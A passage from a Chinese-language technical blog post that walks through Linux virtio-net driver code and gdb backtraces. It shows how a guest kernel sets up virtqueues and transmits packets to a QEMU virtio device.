0xffffffff832ea609 in virtio_net_driver_init () at /home/hawk/Desktop/mqemu/kernel/drivers/net/virtio_net.c:5050</span></span><br><span class="line"><span class="comment">//#14 0xffffffff81001a63 in do_one_initcall (fn=0xffffffff832ea580 &lt;virtio_net_driver_init&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1238</span></span><br><span class="line"><span class="comment">//#15 0xffffffff8328d1d7 in do_initcall_level (command_line=0xffff88810033a140 &quot;rdinit&quot;, level=6) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1300</span></span><br><span class="line"><span class="comment">//#16 do_initcalls () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1316</span></span><br><span class="line"><span class="comment">//#17 do_basic_setup () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1335</span></span><br><span class="line"><span class="comment">//#18 kernel_init_freeable () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1548</span></span><br><span class="line"><span class="comment">//#19 0xffffffff81f657a5 in kernel_init (unused=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1437</span></span><br><span class="line"><span class="comment">//#20 0xffffffff810baddf in ret_from_fork (prev=&lt;optimized out&gt;, regs=0xffffc90000013f58, fn=0xffffffff81f65790 &lt;kernel_init&gt;, fn_arg=0x0 &lt;fixed_percpu_data&gt;) at /home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/process.c:147</span></span><br><span class="line"><span class="comment">//#21 0xffffffff8100244a in ret_from_fork_asm () at /home/hawk/Desktop/mqemu/kernel/arch/x86/entry/entry_64.S:243</span></span><br><span class="line"><span class="comment">//#22 0x0000000000000000 in ?? ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtnet_probe</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">dev-&gt;netdev_ops = &amp;virtnet_netdev;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* Enable multiqueue by default */</span></span><br><span class="line"><span class="keyword">if</span> (num_online_cpus() &gt;= max_queue_pairs)</span><br><span class="line">vi-&gt;curr_queue_pairs = max_queue_pairs;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">vi-&gt;curr_queue_pairs = num_online_cpus();</span><br><span class="line">vi-&gt;max_queue_pairs = max_queue_pairs;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate/initialize the rx/tx queues, and invoke find_vqs */</span></span><br><span class="line">err = init_vqs(vi);</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">init_vqs</span><span class="params">(<span class="keyword">struct</span> virtnet_info *vi)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate send &amp; receive queues */</span></span><br><span class="line">ret = virtnet_alloc_queues(vi);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = virtnet_find_vqs(vi);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err_free;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtnet_find_vqs</span><span class="params">(<span class="keyword">struct</span> virtnet_info *vi)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* We expect 1 RX virtqueue followed by 1 TX virtqueue, followed by</span></span><br><span class="line"><span class="comment"> * possible N-1 RX/TX queue pairs used in multiqueue mode, followed by</span></span><br><span class="line"><span class="comment"> * possible control vq.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">total_vqs = vi-&gt;max_queue_pairs * <span class="number">2</span> +</span><br><span class="line">    virtio_has_feature(vi-&gt;vdev, VIRTIO_NET_F_CTRL_VQ);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate space for find_vqs parameters */</span></span><br><span class="line">vqs = kcalloc(total_vqs, <span class="keyword">sizeof</span>(*vqs), GFP_KERNEL);</span><br><span class="line">    ...</span><br><span class="line">ret = virtio_find_vqs_ctx(vi-&gt;vdev, total_vqs, vqs, callbacks,</span><br><span class="line">  names, ctx, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">virtio_find_vqs_ctx</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev, <span class="type">unsigned</span> nvqs,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> virtqueue *vqs[], <span class="type">vq_callback_t</span> *callbacks[],</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> names[], <span class="type">const</span> <span class="type">bool</span> *ctx,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> irq_affinity *desc)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> vdev-&gt;config-&gt;find_vqs(vdev, nvqs, vqs, callbacks, names, ctx,</span><br><span class="line">      desc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vp_modern_find_vqs</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev, <span class="type">unsigned</span> <span class="type">int</span> nvqs,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> virtqueue *vqs[],</span></span><br><span class="line"><span class="params">      <span class="type">vq_callback_t</span> *callbacks[],</span></span><br><span class="line"><span class="params">      <span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> names[], <span class="type">const</span> <span class="type">bool</span> *ctx,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> irq_affinity *desc)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_device</span> *<span class="title">vp_dev</span> =</span> to_vp_device(vdev);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtqueue</span> *<span class="title">vq</span>;</span></span><br><span class="line"><span class="type">int</span> rc = vp_find_vqs(vdev, nvqs, vqs, callbacks, names, ctx, desc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rc)</span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Select and activate all queues. Has to be done last: once we do</span></span><br><span class="line"><span class="comment"> * this, there&#x27;s no way to go back except reset.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_for_each_entry(vq, &amp;vdev-&gt;vqs, <span class="built_in">list</span>)</span><br><span class="line">vp_modern_set_queue_enable(&amp;vp_dev-&gt;mdev, vq-&gt;index, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vp_find_vqs</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev, <span class="type">unsigned</span> <span class="type">int</span> nvqs,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> virtqueue *vqs[], <span class="type">vq_callback_t</span> *callbacks[],</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> names[], <span class="type">const</span> <span class="type">bool</span> *ctx,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> irq_affinity *desc)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Try MSI-X with one vector per queue. */</span></span><br><span class="line">err = vp_find_vqs_msix(vdev, nvqs, vqs, callbacks, names, <span class="literal">true</span>, ctx, desc);</span><br><span class="line"><span class="keyword">if</span> (!err)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vp_find_vqs_msix</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev, <span class="type">unsigned</span> <span class="type">int</span> nvqs,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> virtqueue *vqs[], <span class="type">vq_callback_t</span> *callbacks[],</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> names[], <span class="type">bool</span> per_vq_vectors,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">bool</span> *ctx,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> irq_affinity *desc)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">allocated_vectors = vp_dev-&gt;msix_used_vectors;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nvqs; ++i) &#123;</span><br><span class="line">        ...</span><br><span class="line">vqs[i] = vp_setup_vq(vdev, queue_idx++, callbacks[i], names[i],</span><br><span class="line">     ctx ? ctx[i] : <span class="literal">false</span>,</span><br><span class="line">     msix_vec);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> virtqueue *<span class="title function_">vp_setup_vq</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev, <span class="type">unsigned</span> <span class="type">int</span> index,</span></span><br><span class="line"><span class="params">     <span class="type">void</span> (*callback)(<span class="keyword">struct</span> virtqueue *vq),</span></span><br><span class="line"><span class="params">     <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">     <span class="type">bool</span> ctx,</span></span><br><span class="line"><span class="params">     u16 msix_vec)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">vq = vp_dev-&gt;setup_vq(vp_dev, info, index, callback, name, ctx,</span><br><span class="line">      msix_vec);</span><br><span class="line">info-&gt;vq = vq;</span><br><span class="line">    ...</span><br><span class="line">vp_dev-&gt;vqs[index] = info;</span><br><span class="line"><span class="keyword">return</span> vq;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> virtqueue *<span class="title function_">setup_vq</span><span class="params">(<span class="keyword">struct</span> virtio_pci_device *vp_dev,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> virtio_pci_vq_info *info,</span></span><br><span class="line"><span class="params">  <span class="type">unsigned</span> <span class="type">int</span> index,</span></span><br><span class="line"><span class="params">  <span class="type">void</span> (*callback)(<span class="keyword">struct</span> virtqueue *vq),</span></span><br><span class="line"><span class="params">  <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">  <span class="type">bool</span> ctx,</span></span><br><span class="line"><span class="params">  u16 msix_vec)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* create the vring */</span></span><br><span class="line">vq = vring_create_virtqueue(index, num,</span><br><span class="line">    SMP_CACHE_BYTES, &amp;vp_dev-&gt;vdev,</span><br><span class="line">    <span class="literal">true</span>, <span class="literal">true</span>, ctx,</span><br><span class="line">    notify, callback, name);</span><br><span class="line">    ...</span><br><span class="line">err = vp_active_vq(vq, msix_vec);</span><br><span class="line">    ...</span><br><span class="line">vq-&gt;priv = (<span class="type">void</span> __force *)vp_modern_map_vq_notify(mdev, index, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vp_active_vq</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq, u16 msix_vec)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_device</span> *<span class="title">vp_dev</span> =</span> to_vp_device(vq-&gt;vdev);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_modern_device</span> *<span class="title">mdev</span> =</span> &amp;vp_dev-&gt;mdev;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> index;</span><br><span class="line"></span><br><span class="line">index = vq-&gt;index;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* activate the queue */</span></span><br><span class="line">vp_modern_set_queue_size(mdev, index, virtqueue_get_vring_size(vq));</span><br><span class="line">vp_modern_queue_address(mdev, index, virtqueue_get_desc_addr(vq),</span><br><span class="line">virtqueue_get_avail_addr(vq),</span><br><span class="line">virtqueue_get_used_addr(vq));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msix_vec != VIRTIO_MSI_NO_VECTOR) &#123;</span><br><span class="line">msix_vec = vp_modern_queue_vector(mdev, index, msix_vec);</span><br><span class="line"><span class="keyword">if</span> (msix_vec == VIRTIO_MSI_NO_VECTOR)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vp_modern_set_queue_size</span><span class="params">(<span class="keyword">struct</span> virtio_pci_modern_device *mdev, u16 index, u16 size)</span></span><br><span class="line">&#123;</span><br><span class="line">vp_iowrite16(index, &amp;mdev-&gt;common-&gt;queue_select);</span><br><span class="line">vp_iowrite16(size, &amp;mdev-&gt;common-&gt;queue_size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vp_modern_queue_address</span><span class="params">(<span class="keyword">struct</span> virtio_pci_modern_device *mdev,</span></span><br><span class="line"><span class="params">     u16 index, u64 desc_addr, u64 driver_addr,</span></span><br><span class="line"><span class="params">     u64 device_addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span> __<span class="title">iomem</span> *<span class="title">cfg</span> =</span> mdev-&gt;common;</span><br><span class="line"></span><br><span class="line">vp_iowrite16(index, &amp;cfg-&gt;queue_select);</span><br><span class="line"></span><br><span class="line">vp_iowrite64_twopart(desc_addr, &amp;cfg-&gt;queue_desc_lo,</span><br><span class="line">     &amp;cfg-&gt;queue_desc_hi);</span><br><span class="line">vp_iowrite64_twopart(driver_addr, &amp;cfg-&gt;queue_avail_lo,</span><br><span class="line">     &amp;cfg-&gt;queue_avail_hi);</span><br><span class="line">vp_iowrite64_twopart(device_addr, &amp;cfg-&gt;queue_used_lo,</span><br><span class="line">     &amp;cfg-&gt;queue_used_hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vp_modern_set_queue_enable</span><span class="params">(<span class="keyword">struct</span> virtio_pci_modern_device *mdev,</span></span><br><span class="line"><span class="params">u16 index, <span class="type">bool</span> enable)</span></span><br><span class="line">&#123;</span><br><span class="line">vp_iowrite16(index, &amp;mdev-&gt;common-&gt;queue_select);</span><br><span class="line">vp_iowrite16(enable, &amp;mdev-&gt;common-&gt;queue_enable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里分配了对应的<strong>virtqueue</strong>数据，并向<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_pci_modern_dev.c#L223"><strong>vp_modern_probe()</strong></a>中解析的<strong>VIRTIO_PCI_CAP_COMMON_CFG配置空间</strong>写入对应的信息，符合前面<a href="#virtio组件">virtio设备的virtio组件设置</a>部分的分析</p><h2 id="数据处理-1"><a href="#数据处理-1" class="headerlink" title="数据处理"></a>数据处理</h2><h3 id="数据传输-1"><a href="#数据传输-1" class="headerlink" title="数据传输"></a>数据传输</h3><p>根据前面<a href="#数据传输">virtio设备的数据传输</a>章节，由于<strong>guest</strong>的pva就是<strong>qemu</strong>进程空间的<strong>hva</strong>，因此对于<strong>guest</strong>来说，正常访问前面分配的<strong>virtqueue</strong>地址即可和<strong>virtio设备</strong>正常进行数据通信。</p><p>这里分析<strong>guest</strong>发送数据的代码来加以确认。在前面<a href="#virtio设置-1">guest的virtio设置</a>小结简单介绍了<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/net/virtio_net.c#L4624"><strong>virtnet_probe()</strong></a>，其中其替换了<strong>struct net_device</strong>结构体的<strong>netdev_ops</strong>字段为<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/net/virtio_net.c#L4169"><strong>virtnet_netdev</strong></a>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtnet_probe</span><span class="params">(<span class="keyword">struct</span> virtio_device *vdev)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* Allocate ourselves a network device with room for our info */</span></span><br><span class="line">dev = alloc_etherdev_mq(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> virtnet_info), max_queue_pairs);</span><br><span class="line"><span class="keyword">if</span> (!dev)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set up network device as normal. */</span></span><br><span class="line">dev-&gt;priv_flags |= IFF_UNICAST_FLT | IFF_LIVE_ADDR_CHANGE |</span><br><span class="line">   IFF_TX_SKB_NO_LINEAR;</span><br><span class="line">dev-&gt;netdev_ops = &amp;virtnet_netdev;</span><br><span class="line">dev-&gt;features = NETIF_F_HIGHDMA;</span><br><span class="line"></span><br><span class="line">dev-&gt;ethtool_ops = &amp;virtnet_ethtool_ops;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_device_ops</span> <span class="title">virtnet_netdev</span> =</span> &#123;</span><br><span class="line">.ndo_open            = virtnet_open,</span><br><span class="line">.ndo_stop        = virtnet_close,</span><br><span class="line">.ndo_start_xmit      = start_xmit,</span><br><span class="line">.ndo_validate_addr   = eth_validate_addr,</span><br><span class="line">.ndo_set_mac_address = virtnet_set_mac_address,</span><br><span class="line">.ndo_set_rx_mode     = virtnet_set_rx_mode,</span><br><span class="line">.ndo_get_stats64     = virtnet_stats,</span><br><span class="line">.ndo_vlan_rx_add_vid = virtnet_vlan_rx_add_vid,</span><br><span class="line">.ndo_vlan_rx_kill_vid = virtnet_vlan_rx_kill_vid,</span><br><span class="line">.ndo_bpf= virtnet_xdp,</span><br><span class="line">.ndo_xdp_xmit= virtnet_xdp_xmit,</span><br><span class="line">.ndo_features_check= passthru_features_check,</span><br><span class="line">.ndo_get_phys_port_name= virtnet_get_phys_port_name,</span><br><span class="line">.ndo_set_features= virtnet_set_features,</span><br><span class="line">.ndo_tx_timeout= virtnet_tx_timeout,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其中<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/net/virtio_net.c#L2402"><strong>start_xmit</strong></a>就是发送数据包的回调函数，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  0xffffffff816969a8 in virtqueue_add (gfp=&lt;optimized out&gt;, ctx=&lt;optimized out&gt;, data=&lt;optimized out&gt;, in_sgs=0, out_sgs=1, total_sg=1, sgs=0xffffc90000003b98, _vq=0xffff88810096f900) at /home/hawk/Desktop/mqemu/kernel/drivers/virtio/virtio_ring.c:2209</span></span><br><span class="line"><span class="comment">//#1  virtqueue_add_outbuf (vq=0xffff88810096f900, sg=sg@entry=0xffff888100370808, num=1, data=data@entry=0xffff88801cefb500, gfp=gfp@entry=2080) at /home/hawk/Desktop/mqemu/kernel/drivers/virtio/virtio_ring.c:2267</span></span><br><span class="line"><span class="comment">//#2  0xffffffff819ed584 in xmit_skb (skb=0xffff88801cefb500, sq=0xffff888100370800) at /home/hawk/Desktop/mqemu/kernel/drivers/net/virtio_net.c:2399</span></span><br><span class="line"><span class="comment">//#3  start_xmit (skb=0xffff88801cefb500, dev=0xffff88810793c000) at /home/hawk/Desktop/mqemu/kernel/drivers/net/virtio_net.c:2426</span></span><br><span class="line"><span class="comment">//#4  0xffffffff81c11797 in __netdev_start_xmit (more=false, dev=0xffff88810793c000, skb=0xffff88801cefb500, ops=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/include/linux/netdevice.h:4903</span></span><br><span class="line"><span class="comment">//#5  netdev_start_xmit (more=false, txq=0xffff88810080f200, dev=0xffff88810793c000, skb=0xffff88801cefb500) at /home/hawk/Desktop/mqemu/kernel/include/linux/netdevice.h:4917</span></span><br><span class="line"><span class="comment">//#6  xmit_one (more=false, txq=0xffff88810080f200, dev=0xffff88810793c000, skb=0xffff88801cefb500) at /home/hawk/Desktop/mqemu/kernel/net/core/dev.c:3531</span></span><br><span class="line"><span class="comment">//#7  dev_hard_start_xmit (first=first@entry=0xffff88801cefb500, dev=dev@entry=0xffff88810793c000, txq=txq@entry=0xffff88810080f200, ret=ret@entry=0xffffc90000003c64) at /home/hawk/Desktop/mqemu/kernel/net/core/dev.c:3547</span></span><br><span class="line"><span class="comment">//#8  0xffffffff81c66525 in sch_direct_xmit (skb=skb@entry=0xffff88801cefb500, q=q@entry=0xffff8880289bbc00, dev=dev@entry=0xffff88810793c000, txq=txq@entry=0xffff88810080f200, root_lock=root_lock@entry=0x0 &lt;fixed_percpu_data&gt;, validate=validate@entry=true) at /home/hawk/Desktop/mqemu/kernel/net/sched/sch_generic.c:343</span></span><br><span class="line"><span class="comment">//#9  0xffffffff81c11e7e in __dev_xmit_skb (txq=0xffff88810080f200, dev=0xffff88810793c000, q=0xffff8880289bbc00, skb=0xffff88801cefb500) at /home/hawk/Desktop/mqemu/kernel/net/core/dev.c:3760</span></span><br><span class="line"><span class="comment">//#10 __dev_queue_xmit (skb=skb@entry=0xffff88801cefb500, sb_dev=sb_dev@entry=0x0 &lt;fixed_percpu_data&gt;) at /home/hawk/Desktop/mqemu/kernel/net/core/dev.c:4301</span></span><br><span class="line"><span class="comment">//#11 0xffffffff81d6d34a in dev_queue_xmit (skb=0xffff88801cefb500) at /home/hawk/Desktop/mqemu/kernel/include/linux/netdevice.h:3091</span></span><br><span class="line"><span class="comment">//#12 neigh_hh_output (skb=&lt;optimized out&gt;, hh=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/include/net/neighbour.h:526</span></span><br><span class="line"><span class="comment">//#13 neigh_output (skip_cache=false, skb=0xffff88801cefb500, n=0xffff888028686800) at /home/hawk/Desktop/mqemu/kernel/include/net/neighbour.h:540</span></span><br><span class="line"><span class="comment">//#14 ip6_finish_output2 (net=&lt;optimized out&gt;, sk=&lt;optimized out&gt;, skb=0xffff88801cefb500) at /home/hawk/Desktop/mqemu/kernel/net/ipv6/ip6_output.c:137</span></span><br><span class="line"><span class="comment">//#15 0xffffffff81d949a5 in ndisc_send_skb (skb=0xffff88801cefb500, daddr=&lt;optimized out&gt;, saddr=0xffffc90000003e80) at /home/hawk/Desktop/mqemu/kernel/net/ipv6/ndisc.c:509</span></span><br><span class="line"><span class="comment">//#16 0xffffffff81d97afa in ndisc_send_rs (dev=&lt;optimized out&gt;, saddr=&lt;optimized out&gt;, daddr=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/net/ipv6/ndisc.c:719</span></span><br><span class="line"><span class="comment">//#17 0xffffffff81d7c143 in addrconf_rs_timer (t=0xffff8881070a63b0) at /home/hawk/Desktop/mqemu/kernel/net/ipv6/addrconf.c:4037</span></span><br><span class="line"><span class="comment">//#18 0xffffffff811b64a5 in call_timer_fn (timer=timer@entry=0xffff8881070a63b0, fn=fn@entry=0xffffffff81d7c070 &lt;addrconf_rs_timer&gt;, baseclk=baseclk@entry=4294687232) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:1793</span></span><br><span class="line"><span class="comment">//#19 0xffffffff811b6782 in expire_timers (head=0xffffc90000003f10, base=0xffff88813bc1e1c0) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:1844</span></span><br><span class="line"><span class="comment">//#20 __run_timers (base=0xffff88813bc1e1c0) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:2418</span></span><br><span class="line"><span class="comment">//#21 __run_timer_base (base=0xffff88813bc1e1c0) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:2429</span></span><br><span class="line"><span class="comment">//#22 0xffffffff811b688c in __run_timer_base (base=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:2424</span></span><br><span class="line"><span class="comment">//#23 run_timer_base (index=1) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:2438</span></span><br><span class="line"><span class="comment">//#24 run_timer_softirq (h=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/kernel/time/timer.c:2448</span></span><br><span class="line"><span class="comment">//#25 0xffffffff81f6f6af in __do_softirq () at /home/hawk/Desktop/mqemu/kernel/kernel/softirq.c:554</span></span><br><span class="line"><span class="comment">//#26 0xffffffff8110e814 in invoke_softirq () at /home/hawk/Desktop/mqemu/kernel/kernel/softirq.c:428</span></span><br><span class="line"><span class="comment">//#27 __irq_exit_rcu () at /home/hawk/Desktop/mqemu/kernel/kernel/softirq.c:633</span></span><br><span class="line"><span class="comment">//#28 irq_exit_rcu () at /home/hawk/Desktop/mqemu/kernel/kernel/softirq.c:645</span></span><br><span class="line"><span class="comment">//#29 0xffffffff81f63220 in instr_sysvec_apic_timer_interrupt (regs=0xffffffff82a03de8) at /home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/apic/apic.c:1043</span></span><br><span class="line"><span class="comment">//#30 sysvec_apic_timer_interrupt (regs=0xffffffff82a03de8) at 